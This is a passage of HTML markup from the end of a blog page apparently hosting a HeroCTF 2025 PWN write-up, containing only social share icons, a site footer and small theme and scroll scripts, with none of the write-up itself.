1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HeroCTF2025 PWN Writeup on telegram" href="https://telegram.me/share/url?text=HeroCTF2025%20PWN%20Writeup&amp;url=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fheroctf2025-writeup%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HeroCTF2025 PWN Writeup on ycombinator" href="https://news.ycombinator.com/submitlink?t=HeroCTF2025%20PWN%20Writeup&u=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fheroctf2025-writeup%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://wgggggggg.github.io/>Wgg's Blog Site</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>